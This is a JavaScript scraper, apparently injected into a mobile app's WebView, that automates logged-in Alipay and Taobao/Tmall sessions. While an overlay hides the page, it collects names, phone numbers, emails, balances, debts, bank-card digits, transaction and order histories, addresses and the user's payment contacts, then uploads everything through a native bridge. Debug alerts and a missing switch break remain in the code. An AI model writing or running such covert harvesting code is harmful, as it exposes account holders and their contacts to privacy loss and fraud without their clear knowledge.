/*
*** 数据采集 JS 
*/
var timer = setInterval(function(){
	var readyState = document.readyState;
	if(readyState == "complete"){
		clearInterval(timer);
		if(window.lock == null || window.lock == undefined){
			window.lock = 'locked';
			if(typeof jQuery == null || typeof jQuery == "undefined"){
				init();
			}else{
				run();
			}
		}
	}
}, 100);


function init(){
	addJQuery();
	var timer = setInterval(function(){
		if(typeof jQuery == "function"){
			clearInterval(timer);
			run();
		}
	}, 100);
}


/*开始运行*/
function run(){
	
	var product = getDataFromLocalStorage('product');

	switch(product){
		case 'alipay':
			setTimeout(alipayInfoCapture, 200);
			break;
		case 'taobao':
			setTimeout(taobaoInfoCapture, 200);
			break;
		case 'tmall':
			setTimeout(taobaoInfoCapture, 200);
			break;
		case 'jd':
			setTimeout(jdInfoCapture, 200);
			break;
		default:
			setTimeout(chooseProduct, 200);
	}
}


/*根据 domain 确认数据采集对象*/
function chooseProduct(){

	var host = window.location.host;

	if(host.indexOf('alipay')>-1){

		/*支付宝数据采集*/
		saveDataToLocalStorage('product', 'alipay');
		alipayInfoCapture();

	}else if(host.indexOf('taobao')>-1){

		/*淘宝数据采集*/
		saveDataToLocalStorage('product', 'taobao');
		taobaoInfoCapture();

	}else if(host.indexOf('tmall')>-1){

		/*淘宝数据采集*/
		saveDataToLocalStorage('product', 'tmall');
		taobaoInfoCapture();

	}else if(host.indexOf('jd')>-1){

		/*京东数据采集*/
		saveDataToLocalStorage('product', 'jd');
		jdInfoCapture();

	}else{
		return ;
	}
}


/*支付宝数据采集*/
function alipayInfoCapture(){

	/*获取当前处于采集某一阶段*/
	var step = getDataFromLocalStorage('alipayStep');

	if(step >= 1 && step <= 6){
		setLayout(0);
	}

	switch(step){
		case '0':
			setTimeout(alipayWaitLogin, 1000);
			break;
		case '1': /*获取蚂蚁花呗额度*/
			setTimeout(alipayGetAntsLines, 1000);
			break;
		case '3': /*获取账户资产信息*/
			setTimeout(alipayGetWealth, 1000);
			break;
		case '2': /*获取交易记录信息*/
			setTimeout(alipayGetDealRecord, 1000);
			break;
		case '4': /*获取账户基本信息*/
			setTimeout(alipayGetBasicInfo, 1000);
			break;
		case '5': /*获取支付宝转账联系人信息*/
			setTimeout(alipayGetFriendsInfo, 1000);
			break;
		case '6': /*将信息上传服务器*/
			alipayUploadInfo();
			break;
		default:
			setTimeout(alipayWaitLogin, 1000);
	}
}


function alipayWaitLogin(){

	alipayShanghuSwitchPersonal("");

	/*来自商户页面切换*/
	var nextUrl = getDataFromLocalStorage('nextUrl');
	var nextStep = getDataFromLocalStorage('nextStep');

	if(nextUrl != "" && nextStep != "" && nextStep > 0){
		saveDataToLocalStorage('alipayStep', nextStep);
		location.href = nextUrl;
	}

	var title = document.title;

	if(title == '我的支付宝 － 支付宝'){

		/*页面遮罩*/
		// setLayout(0);

		// /*蚂蚁花呗额度*/
		// var antsLines = 0;

		// /*页面断言*/
		// var str = jQuery('.i-assets-header.fn-clear').eq(2).find('h3').text();

		// if(str == "蚂蚁花呗"){

		// 	/*判断开通情况*/
		// 	str = jQuery('.amount-des').closest('.i-assets-content').find('a').text().trim();

		// 	if(str.indexOf('开 通')>-1){

		// 		antsLines = 0;

		// 	}else if(str.indexOf('查 看')>-1){

		// 		antsLines = jQuery('.amount-des strong:eq(0)').text();

		// 	}else if(str.indexOf('还 款')>-1){

		// 		saveDataToLocalStorage('alipayStep', 1);

		// 		setProgress(5);

		// 		/*跳转蚂蚁花呗页面*/
		// 		location.href = "https://f.alipay.com/moonlight/index.htm";

		// 	}
		// }

		// saveDataToLocalStorage('antsLines', antsLines);

		saveDataToLocalStorage('alipayStep', 2);

		setProgress(10);

		/*跳转账户资产页面*/
		/*location.href = "https://my.alipay.com/wealth/index.html";*/

		/*跳转交易记录页面*/
		/*location.href = 'https://consumeprod.alipay.com/record/index.htm';*/
		setTimeout(function(){
			alert(1);
			jQuery('.global-nav li:eq(1) a')[0].click();
		}, 3000);
	}
}


function alipayGetAntsLines(){

	alipayShanghuSwitchPersonal("https://f.alipay.com/moonlight/index.htm");

	/*页面断言*/
	var str = jQuery('.app-name').text().trim();

	if(str != "蚂蚁花呗"){

		noticeAlarm('AlipayGetAntsLines 蚂蚁花呗 Not Found Else ' + str + ' ', 0);

	}else{

		var antsLines = jQuery('.inner p:eq(2)').text().trim();

		saveDataToLocalStorage('antsLines', antsLines);

		saveDataToLocalStorage('alipayStep', 2);

		setProgress(10);

		/*跳转账户资产页面*/
		/*location.href = "https://my.alipay.com/wealth/index.html";*/

		/*跳转交易记录页面*/
		/*location.href = 'https://consumeprod.alipay.com/record/index.htm';*/
		setTimeout(function(){
			alert(1);
			jQuery('.global-nav li:eq(1) a')[0].click();
		}, 3000);
	}
}


function alipayGetWealth(){

	alipayShanghuSwitchPersonal("https://my.alipay.com/wealth/index.html");

	/*页面断言*/
    var str1 = jQuery('h3.tip-title span').eq(0).text();
    var str2 = jQuery('h3.tip-title span').eq(2).text();

    if(str1 != "账户总资产：" || str2 != "总欠款："){
        noticeAlarm('AlipayGetWealth 账户总资产 总欠款 Not Found ', 0);
        return;
    }

    /*账户总资产，蚂蚁花呗欠款*/
    /*wealth, antsArrears*/
    var wealth = jQuery('h3.tip-title span').eq(1).text();
    var antsArrears = window.context.debts[0].debt / 100;

    /*余额，余额宝，招财宝，基金，存金宝，淘宝理财*/
    /*balance, balanceBao, fortuneBao, fund, depositBao, taobaoFinancial */
    var balance = window.context.wealth.general[0]['value'] / 100;            	
    var balanceBao = window.context.wealth.general[1]['value'] / 100;         	
    var fortuneBao = window.context.wealth.general[2]['value'] / 100;        	
    var fund = window.context.wealth.general[3]['value'] / 100;              	
    var depositBao = window.context.wealth.general[4]['value'] / 100;       	
    var taobaoFinancial = window.context.wealth.general[5]['value'] / 100;  	

    saveDataToLocalStorage('wealth', wealth);
    saveDataToLocalStorage('antsArrears', antsArrears);
    saveDataToLocalStorage('balance', balance);
    saveDataToLocalStorage('balanceBao', balanceBao);
    saveDataToLocalStorage('fortuneBao', fortuneBao);
    saveDataToLocalStorage('fund', fund);
    saveDataToLocalStorage('depositBao', depositBao);
    saveDataToLocalStorage('taobaoFinancial', taobaoFinancial);
    
    setProgress(20);

    var cardsInfo = "";
    var cards = window.context.cards;
    var length = cards.length;
    for(var i=0;i<length;i++){
    	var card = cards[i];
    	cardsInfo += card.instName + '-' + card.cardType + '-' + card.cardNoLast4 + ';';
    }

    saveDataToLocalStorage('bankCards', cardsInfo);

    saveDataToLocalStorage('alipayProgress', 30);

    saveDataToLocalStorage('alipayStep', 4);

	setProgress(30);

	/*跳转交易记录页面*/
	/*location.href = 'https://consumeprod.alipay.com/record/index.htm';*/

	/*跳转个人信息*/
	location.href = 'https://custweb.alipay.com/account/index.htm';
}


function alipayGetDealRecord(){

	alipayShanghuSwitchPersonal('https://consumeprod.alipay.com/record/index.htm');

	/*页面断言*/
	var title = document.title;
	if(title != "我的账单 - 支付宝"){
		noticeAlarm('AlipayGetDealRecord(Title) 我的账单 - 支付宝 Differ', 0);
		return;
	}

	var str = jQuery('.ui-title.fn-clear').find('.fn-left').text();
	if(str == "我的账单"){
		/*标准版*/
		jQuery('.ui-title.fn-clear.gradient-line').find('.link').find('a')[0].click();
	}else if(str == "交易记录"){
		var timeRange = jQuery("#J-select-range option:selected").text();

		if(timeRange == "最近三个月"){
			var dealRecord = getDataFromLocalStorage('dealRecord');
			var text = jQuery('tbody')[0].innerText;
			dealRecord += text;

			saveDataToLocalStorage('dealRecord', dealRecord);

			var progress = getDataFromLocalStorage('alipayProgress') - 0;
			if(progress < 80){
				progress += 3;
				setProgress(progress);
				saveDataToLocalStorage('alipayProgress', progress);
			}

			/*判断是否有下一页*/
			var length = jQuery('span.ui-button-text').length;

			if(length == 1){
				text = jQuery('span.ui-button-text').text();
				if(text == "上一页"){
					/*只有上一页*/
					saveDataToLocalStorage('alipayStep', 3);
					// url = 'https://custweb.alipay.com/account/index.htm';
					url = 'https://my.alipay.com/wealth/index.html';
					location.href = url;
				}else{
					/*有下一页*/
					jQuery('span.ui-button-text').click();
				}
			}else if(length == 2){
				/*有下一页*/
				jQuery('span.ui-button-text')[1].click();
			}else{
				saveDataToLocalStorage('alipayStep', 3);
				// url = 'https://custweb.alipay.com/account/index.htm';
				url = 'https://my.alipay.com/wealth/index.html';
				location.href = url;
			}

		}else{
			setTimeout(function(){
				alert(2);
				var i = Math.round(Math.random()+1);
				jQuery('.ui-select.ui-select-middle .ui-select-content').eq(0).find('li').eq(i).click();
				jQuery('.ui-select.ui-select-middle .ui-select-content').eq(0).find('li').eq(3).click();
				jQuery('.amount-top .action-content .amount-links').click();
				jQuery('#J-set-query-form')[0].click();
			}, 1000);
				
		}
	}else{
		noticeAlarm('AlipayGetDealRecord(StandardOrAdvanced) 账单页面切换异常 ', 0);
		return;
	}
}


function alipayGetBasicInfo(){

	alipayShanghuSwitchPersonal('https://custweb.alipay.com/account/index.htm');

	/*页面断言*/
	var str1 = jQuery('#account-main').find('th').eq(0).text();
	var str2 = jQuery('#account-main').find('th').eq(1).text();
	var str3 = jQuery('#account-main').find('th').eq(2).text();
	var str4 = jQuery('#account-main').find('th').eq(3).text();
	var str5 = jQuery('#account-main').find('th').eq(6).text();
	
	if(str1!="真实姓名" || str2!="邮箱" || str3!="手机" || str4!="淘宝会员名" || str5!="注册时间"){
		noticeAlarm('AlipayGetBasicInfo '+str1+' '+str2+' '+str3+' '+str4+' '+str5+' Differ ', 0);
		return;
	}

	var realName = jQuery('#account-main').find('td').eq(0).find('span').text();
	var email = jQuery('#account-main').find('td').eq(2).find('span').text();
	var mobile = jQuery('#account-main').find('td').eq(4).find('span').text();
	var registerTime = jQuery('#account-main').find('td').eq(12).text();

	saveDataToLocalStorage('realName', realName);
	saveDataToLocalStorage('email', email);
	saveDataToLocalStorage('mobile', mobile);
	saveDataToLocalStorage('registerTime', registerTime);

	var temp = jQuery('#account-main').find('td').eq(7).find('span').text();
	if(temp == "查看我的淘宝"){
		var taobaoName = jQuery('#account-main').find('td').eq(6).text();
		saveDataToLocalStorage('taobaoName', taobaoName);
	}

	saveDataToLocalStorage('alipayStep', 5);

	setProgress(80);

	location.href = "http://app.alipay.com/appGateway.htm?appId=1000000017";
}


function alipayGetFriendsInfo(){

	/*页面断言*/
	var str = jQuery('.ui-tab4-trigger-item.ui-tab4-trigger-item-current a').text();
	if(str != "a转账到支付宝"){

		var htmlContent = jQuery('.page-head').html();

		saveDataToLocalStorage('friendsContact', "");
		saveDataToLocalStorage('tradeContact', "");
		saveDataToLocalStorage('exception', "AlipayGetFriendsInfo 转账到支付宝 Not Found 跳过继续执行");
		saveDataToLocalStorage('htmlContent', htmlContent);

		setProgress(90);

		alipayUploadInfo();

	}else{
		jQuery('#addFromContacts').click();

		jQuery('#groupDrop').click();

		var timer =  setInterval(function(){

			var friendsContact = jQuery('.ui-contacts-group.daparser-11 div').eq(0).text();

			if(friendsContact.indexOf('contacts') == -1){

				clearInterval(timer);

				jQuery('.daparser-7').find('a:eq(0)').click();

				timer =  setInterval(function(){
					var tradeContact = jQuery('.ui-contacts-group.daparser-11 div').eq(2).text();

					if(tradeContact.indexOf('contacts') == -1){

						clearInterval(timer);
						
						saveDataToLocalStorage('friendsContact', friendsContact);
						saveDataToLocalStorage('tradeContact', tradeContact);

						setProgress(90);

						alipayUploadInfo();
					}
				}, 200);
			}
		}, 200);
	}
}


function alipayUploadInfo(){

	var data = {};
	data.code = 200;
	data.product = 'alipay';
	data.exception = getDataFromLocalStorage('exception');
	data.info = {};
	data.info.antsLines = getDataFromLocalStorage('antsLines');
	data.info.wealth = getDataFromLocalStorage('wealth');
	data.info.antsArrears = getDataFromLocalStorage('antsArrears');
	data.info.balance = getDataFromLocalStorage('balance');
	data.info.balanceBao = getDataFromLocalStorage('balanceBao');
	data.info.fortuneBao = getDataFromLocalStorage('fortuneBao');
	data.info.fund = getDataFromLocalStorage('fund');
	data.info.depositBao = getDataFromLocalStorage('depositBao');
	data.info.taobaoFinancial = getDataFromLocalStorage('taobaoFinancial');
	data.info.bankCards = getDataFromLocalStorage('bankCards');
	data.info.dealRecord = getDataFromLocalStorage('dealRecord');
	data.info.realName = getDataFromLocalStorage('realName');
	data.info.email = getDataFromLocalStorage('email');
	data.info.mobile = getDataFromLocalStorage('mobile');
	data.info.registerTime = getDataFromLocalStorage('registerTime');
	data.info.taobaoName = getDataFromLocalStorage('taobaoName');
	data.info.friendsContact = getDataFromLocalStorage('friendsContact');
	data.info.tradeContact = getDataFromLocalStorage('tradeContact');
	data.info.exception = getDataFromLocalStorage('htmlContent');

	var result = JSON.stringify(data);

	uploadInfo(result);

	setProgress(100);
}


function alipayShanghuSwitchPersonal(url){

	var host = window.location.host;

	if(host.indexOf('shanghu')>-1){

		setLayout(0);

		saveDataToLocalStorage('nextUrl', url);

		saveDataToLocalStorage('nextStep', getDataFromLocalStorage('alipayStep'));
		
		saveDataToLocalStorage('alipayStep', 0);

		location.href = "https://shanghu.alipay.com/home/switchPersonal.htm";

	}
}

function alipaySwitchVendorToPerson(url){
	var str = jQuery('#container #global-header #global-header-area div h2').text();
	if(str == "商户版"){
		setLayout(0);
		saveDataToLocalStorage('nextUrl', url);
		saveDataToLocalStorage('nextStep', getDataFromLocalStorage('alipayStep'));
		saveDataToLocalStorage('alipayStep', 0);
		location.href = "https://shanghu.alipay.com/home/switchPersonal.htm";
	}
}


/*淘宝数据采集*/
function taobaoInfoCapture(){

	/*获取当前处于采集某一阶段*/
	var step = getDataFromLocalStorage('taobaoStep');

	if(step >= 1 && step <= 10){
		setLayout(0);
	}

	switch(step){
		case '1': /*获取账号管理基础信息*/
			taobaoGetBasicInfo();
			break;
		case '2': /*获取个人成长信息*/
			taobaoGetGrowthInfo();
			break;
		case '3': /*获取支付宝绑定设置*/
			taobaoGetAlipayBinding();
			break;
		case '4': /*获取淘宝收货地址*/
			taobaoGetAddress();
			break;
		case '5': /*为获取淘宝订单做准备*/
			taobaoWaitGetDealRecord();
			break;
		case '6': /*开始获取淘宝订单*/
			taobaoGetDealRecord();
			break;
		case '7': /*获取评价管理*/
			taobaoGetEvaluation();
			break;
		case '8': /*获取天猫积分*/
			taobaoGetTianMaoPoint();
			break;
		case '9': /*获取天猫经验*/
			taobaoGetTianMaoExperience();
			break;
		case '10': /*将信息上传服务器*/
			taobaoUploadInfo();
		default:
			taobaoWaitLogin();
	}
}

function taobaoWaitLogin(){

	var title = document.title;
	var host = window.location.host;

	if(host.indexOf("i.taobao")!=-1 && title == "我的淘宝"){
		/*页面遮罩*/
		setLayout(0);

		/*页面断言*/
		var str = jQuery('.J_MtNavSubTrigger .mt-nav-parent').text();
		if(str != "账户设置"){
			noticeAlarm('TaobaoWaitLogin 账户设置 Not Found ', 1);
		}else{
			
			/*缓存URL*/
			var str = jQuery('.mt-menu-sub.unfold.fold.J_MtSideTree:eq(3)').text();
			var pointUrl = jQuery('.mt-menu-sub.unfold.fold.J_MtSideTree:eq(3) a').attr('href');
			if(str != "天猫积分" || pointUrl == ""){
				pointUrl = "https://vip.tmall.com/vip/index.htm";
			}

			saveDataToLocalStorage('pointUrl', pointUrl);

			saveDataToLocalStorage('taobaoStep', 1);

			setProgress(5);

			var href = "https://member1.taobao.com/member/fresh/account_security.htm";

			location.href = href;
		}
	}
}


function taobaoGetBasicInfo(){

	/*页面断言*/
	var str1 = jQuery('.account-info li:eq(0) span:eq(0)').text();
	var str2 = jQuery('.account-info li:eq(1) span:eq(0)').text();
	var str3 = jQuery('.account-info li:eq(2) span:eq(0)').text();

	if(str1 != "会员名" || str2 != "登 录 邮 箱：" || str3 != "绑 定 手 机："){
		noticeAlarm('TaobaoGetBasicInfo 基础信息字段 Not Found ', 1);
	}else{
		var taobaoName = jQuery('.account-info li:eq(0) span:eq(1)').text();
		var loginEmail = jQuery('.account-info li:eq(1) span:eq(1)').text();
		var bindingMobile = jQuery('.account-info li:eq(2) span:eq(1)').text().trim();

		saveDataToLocalStorage('taobaoName', taobaoName);
		saveDataToLocalStorage('loginEmail', loginEmail);
		saveDataToLocalStorage('bindingMobile', bindingMobile);

		saveDataToLocalStorage('taobaoStep', 2);

		setProgress(10);

		/*缓存各个页面URL 减少页面跳转*/
		var alipayBindingUrl = jQuery('#newAccountManagement a').attr('href');
		var taobaoAddressUrl = jQuery('#newDeliverAddress a').attr('href');
		saveDataToLocalStorage('alipayBindingUrl', alipayBindingUrl);
		saveDataToLocalStorage('taobaoAddressUrl', taobaoAddressUrl);

		var href = jQuery('#newAccountUser a').attr('href');

		location.href = href;

	}
}


function taobaoGetGrowthInfo(){

	/*页面断言*/
	var str = jQuery('.vip_growth_number.vip_growth_position').text();
	if(str.indexOf('我的成长值') == -1){
		noticeAlarm('TaobaoGetGrowthInfo 我的成长值 Not Found ', 1);
	}else{
		var growth = jQuery('.vip_growth_number.vip_growth_position strong').text();

		saveDataToLocalStorage('growth', growth);

		saveDataToLocalStorage('taobaoStep', 3);

		setProgress(20);

		var href = getDataFromLocalStorage('alipayBindingUrl');

		location.href = href;
	}
}


function taobaoGetAlipayBinding(){


	var bindingStatus = jQuery('h3').text();
	if(bindingStatus == "你的淘宝账户还未绑定支付宝账户，请赶快绑定吧！"){
		saveDataToLocalStorage('alipayEmail', "");
		saveDataToLocalStorage('alipayMobile', "");
		saveDataToLocalStorage('accountType', "未绑定支付宝账户");
		saveDataToLocalStorage('realName', "");
		saveDataToLocalStorage('taobaoStep', 4);
		setProgress(30);
		var href = getDataFromLocalStorage('taobaoAddressUrl');
		location.href = href;
	} else {
		/*页面断言*/
		var str1 = jQuery('.table-list th:eq(0)').text();
		var str2 = jQuery('.table-list th:eq(1)').text();
		var str3 = jQuery('.table-list th:eq(2)').text();
		var str4 = jQuery('.table-list th:eq(3)').text();

		if(str1 != "邮箱" || str2 != "绑定手机" || str3 != "账户类型" || str4 != "实名认证"){
			noticeAlarm('TaobaoGetAlipayBinding '+str1+' '+str2+' '+str3+' '+str4+' Differ ', 1);
		}else{
			var alipayEmail = jQuery('.table-list td:eq(0)').text().trim();
			var alipayMobile = jQuery('.table-list td:eq(2)').text().trim();
			var accountType = jQuery('.table-list td:eq(4)').text().trim();
			var realName = jQuery('.table-list td:eq(6)').text().trim();

			saveDataToLocalStorage('alipayEmail', alipayEmail);
			saveDataToLocalStorage('alipayMobile', alipayMobile);
			saveDataToLocalStorage('accountType', accountType);
			saveDataToLocalStorage('realName', realName);

			saveDataToLocalStorage('taobaoStep', 4);

			setProgress(30);

			var href = getDataFromLocalStorage('taobaoAddressUrl');

			location.href = href;
		}
	}

	
}


function taobaoGetAddress(){

	/*页面断言*/
	var str = jQuery('#content h2:eq(0)').text();
	if(str != "收货地址"){
		noticeAlarm('TaobaoGetAddress 收货地址 Not Found ', 1);
	}else{
		var result = '';
		var list = jQuery('tbody tr');
		var length = list.length;
		for(var i=1;i<length;i++){
			obj = list.eq(i).find('td');
			result += obj.eq(0).text().trim()+' '+obj.eq(4).text().trim()+':'+obj.eq(1).text().trim()+' '+obj.eq(2).text().trim()+' '+obj.eq(3).text().trim()+'\r\n';
		}

		saveDataToLocalStorage('taobaoAddress', result);

		saveDataToLocalStorage('taobaoStep', 5);

		setProgress(40);

		var href = jQuery('.J_Menu.menu.my-taobao .menu-bd-panel a:eq(0)').attr('href');

		location.href = href;
	}
}


function taobaoWaitGetDealRecord(){

	/*页面断言*/
	var str1 = jQuery('.mt-menu-item:eq(0) dt').text();
	var title = document.title;
	if(str1 != "我的交易" || title != "已买到的宝贝"){
		noticeAlarm('TaobaoGetDealRecord 我的交易 已买到的宝贝 Not Found ', 1);
	}else{

		/*缓存URL*/
		var rateUrl = jQuery('#myRate a').attr('href');

		saveDataToLocalStorage('rateUrl', rateUrl);

		taobaoGetDealRecord("", 0, 40);
	}
}


function taobaoGetDealRecord(result, count, progress){

	/*用于区分ajax是否加载完毕*/
	var flag = jQuery("div[class^='index-mod__order-container']:eq(0) tbody:eq(0) td:eq(0) span:eq(4)").text(); 

	var list = jQuery("div[class^='index-mod__order-container']");
	var length = list.length;

	for(var i=0;i<length;i++){
		var obj = list.eq(i);
		var head = obj.find('tbody:eq(0)');
		var body = obj.find('tbody:eq(1)');
		var date = head.find('td:eq(0) span:eq(0)').text();
		var orderNo = head.find('td:eq(0) span:eq(4)').text();
		var store = head.find('td:eq(1) span:eq(0)').text();
		var product = body.find('span:eq(2)').text();
		var price = body.find('td:eq(1) span:eq(3)').text(); /*单价（优惠后实际单价）*/
		if(price == ""){
			price = body.find('td:eq(1) span:eq(1)').text();
		}
		var num = body.find('td:eq(2)').text();
		var totalPrice = body.find('td:eq(4) span:eq(1)').text();
		var dealResult = body.find('td:eq(5) span:eq(0)').text();

		result += date+' --- '+orderNo+' --- '+store+' --- '+product+' --- '+price+' --- '+num+' --- '+totalPrice+' --- '+dealResult+' \r\n';
	}

	count ++;
	progress += 4;
	setProgress(progress);

	if(count < 10){
		var nextButton = jQuery('#J_bought_main > div > div:nth-child(6) > div:nth-child(2) > div > button:nth-child(2)');
		var style = nextButton.attr('disabled');
		if(style != 'disabled'){
			nextButton.click();
			var timer = setInterval(function(){
				var checkFlag = jQuery("div[class^='index-mod__order-container']:eq(0) tbody:eq(0) td:eq(0) span:eq(4)").text();
				if(flag != checkFlag){
					clearInterval(timer);
					taobaoGetDealRecord(result, count, progress);
				}
			}, 200);
		}else{
			taobaoEndGetDealRecord(result);
		}
	}else{
		taobaoEndGetDealRecord(result);
	}
}


function taobaoEndGetDealRecord(result){

	saveDataToLocalStorage('dealRecord', result);
	saveDataToLocalStorage('taobaoStep', 7);
	setProgress(80);

	var href = getDataFromLocalStorage('rateUrl');
	location.href = href;
}


function taobaoGetEvaluation(){

	/*页面断言*/
	var str = jQuery('.tb-rate-nav-tabs.level-1 li:eq(0)').text();
	if(str != "我的评价"){
		noticeAlarm('TaobaoGetEvaluation 我的评价 Not Found ', 1);
	}else{

		var creditPoint = jQuery('.tb-rate-ico-bg.ico-buyer a:eq(0)').text();

		var goodRateList = jQuery('.tb-rate-table.align-c tbody tr:eq(0)');
		var middleRateList = jQuery('.tb-rate-table.align-c tbody tr:eq(1)');
		var badRateList = jQuery('.tb-rate-table.align-c tbody tr:eq(2)');

		var goodRate = "";
		var middleRate = "";
		var badRate = "";

		for(var i=1;i<=5;i++){
			goodRate += goodRateList.find('td').eq(i).text()+' ';
			middleRate += middleRateList.find('td').eq(i).text()+' ';
			badRate += badRateList.find('td').eq(i).text()+' ';
		}

		saveDataToLocalStorage('creditPoint', creditPoint);
		saveDataToLocalStorage('goodRate', goodRate);
		saveDataToLocalStorage('middleRate', middleRate);
		saveDataToLocalStorage('badRate', badRate);
		saveDataToLocalStorage('taobaoStep', 8);
		setProgress(85);
		var href = getDataFromLocalStorage('pointUrl');
		location.href = href;


	}
}

function taobaoGetTianMaoPoint(){
	/*页面断言*/
	var str = document.title;
	var ssr = jQuery('body div.head').text().trim();
	var host =  window.location.host;
	if(str == "天猫会员"){
		setLayout(0);
		setProgress(85);
		var point = jQuery('.point.j_top_point').length;
		var creditLevel = jQuery('.value').length;
		var level = jQuery('.garden').length;

		var tianMaoPoint = jQuery('.point.j_top_point').text().trim();
		var tianMaoCreditLevel = jQuery('.idlevel .value').text();
		var tianMaoLevel = jQuery('.garden').text().trim();

		var active = jQuery('div.activeTips').text().trim();
		active = active.replace(/ |\n/g, "");

		if(active == "您还不是天猫会员，激活立享会员特权去激活"){
			if(creditLevel == 0){
				tianMaoCreditLevel = "天猫会员未激活";
			}
			saveDataToLocalStorage('tianMaoPoint', tianMaoPoint);
			saveDataToLocalStorage('tianMaoCreditLevel', tianMaoCreditLevel);
			saveDataToLocalStorage('tianMaoLevel', tianMaoLevel);
			setProgress(90);

			var tianMaoExperience = "";
			saveDataToLocalStorage('tianMaoExperience', tianMaoExperience);
			saveDataToLocalStorage('taobaoStep', 10);
			setProgress(95);
			taobaoUploadInfo();
		} else if(point == 0 || creditLevel == 0 || level == 0){
			noticeAlarm('TaobaoGetTianMaoPoint 天猫积分 信誉评级 会员等级 Not Found ', 1);
		} else{
			saveDataToLocalStorage('tianMaoPoint', tianMaoPoint);
			saveDataToLocalStorage('tianMaoCreditLevel', tianMaoCreditLevel);
			saveDataToLocalStorage('tianMaoLevel', tianMaoLevel);

			saveDataToLocalStorage('taobaoStep', 9);
			setProgress(90);

			location.href = "https://vip.tmall.com/mobile/my/privMy.htm";
		}
	} else if(ssr == "淘宝账户登录" || host.indexOf('login')>-1){
		setLayout(1);
	} else{
		setLayout(0);
		noticeAlarm('TaobaoGetTianMaoPointPageJumping 天猫积分 页面跳转异常', 1);
	}
}

function taobaoGetTianMaoExperience(){

	/*断言*/
	/*var str = jQuery('.my.select').text().trim();*/
	var str = document.title;
	if(str != "my特权" && str != "天猫会员"){
		noticeAlarm('TaobaoGetTianMaoExperience my特权 Not Found ', 1);
	}else{

		var tianMaoExperience = "";

		if(str == "my特权"){
			tianMaoExperience = jQuery('.gardenInfo .tag:eq(0)').text();
		}

		saveDataToLocalStorage('tianMaoExperience', tianMaoExperience);

		saveDataToLocalStorage('taobaoStep', 10);

		setProgress(95);

		taobaoUploadInfo();
	}

}


function taobaoUploadInfo(){

	var data = {};
	data.code = 200;
	data.product = 'taobao';
	data.exception = getDataFromLocalStorage('exception');
	data.info = {};
	data.info.taobaoName = getDataFromLocalStorage('taobaoName');
	data.info.loginEmail = getDataFromLocalStorage('loginEmail');
	data.info.bindingMobile = getDataFromLocalStorage('bindingMobile');
	data.info.growth = getDataFromLocalStorage('growth');
	data.info.alipayEmail = getDataFromLocalStorage('alipayEmail');
	data.info.alipayMobile = getDataFromLocalStorage('alipayMobile');
	data.info.accountType = getDataFromLocalStorage('accountType');
	data.info.realName = getDataFromLocalStorage('realName');
	data.info.taobaoAddress = getDataFromLocalStorage('taobaoAddress');
	data.info.dealRecord = getDataFromLocalStorage('dealRecord');
	data.info.creditPoint = getDataFromLocalStorage('creditPoint');
	data.info.goodRate = getDataFromLocalStorage('goodRate');
	data.info.middleRate = getDataFromLocalStorage('middleRate');
	data.info.badRate = getDataFromLocalStorage('badRate');
	data.info.tianMaoPoint = getDataFromLocalStorage('tianMaoPoint');
	data.info.tianMaoCreditLevel = getDataFromLocalStorage('tianMaoCreditLevel');
	data.info.tianMaoLevel = getDataFromLocalStorage('tianMaoLevel');
	data.info.tianMaoExperience = getDataFromLocalStorage('tianMaoExperience');
	data.info.exception = getDataFromLocalStorage('htmlContent');

	var result = JSON.stringify(data);

	uploadInfo(result);

	setProgress(100);
}


/*京东数据采集*/
function jdInfoCapture(){

}


/*从本地存储获取数据*/
function getDataFromLocalStorage(key){

	var result = nativeMethod.getText(key);
	if(result == null || result == undefined){
		result = "";
	}
	return result;
}


/*将数据临时存储*/
function saveDataToLocalStorage(key, value){

	nativeMethod.saveText(key,value);
}


function clearLocalStorage(){

	localStorage.clear();
}


/*上传数据到服务器*/
function uploadInfo(value){

	nativeMethod.submitText(value);
}


/*告警*/
function noticeAlarm(value, product){

	if(product == 0){
		product = 'alipay';
	}else if(product == 1){
		product = 'taobao';
	}else if(product == 2){
		product = 'jd';
	}

	var data = {};
	data.code = 500;
	data.product = product;
	data.info = value + ' : Page Title = ' + document.title + ' And Url = ' + window.location.href;
	
	data.html = nativeMethod.uploadPage();

	var result = JSON.stringify(data);
	nativeMethod.submitText(result);
}


/*调整遮罩层*/
function setLayout(state){

	nativeMethod.goneLayout(state);
}


/*传递进度条参数*/
function setProgress(progress){

	nativeMethod.setProgress(progress);
}


/*引入JS*/
function addJs(to_url){
	var new_script = document.createElement('script');
	new_script.src = to_url;
	document.getElementsByTagName('HEAD')[0].appendChild(new_script);
}


/*引入JQuery*/
function addJQuery(){
	addJs('https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js');
}



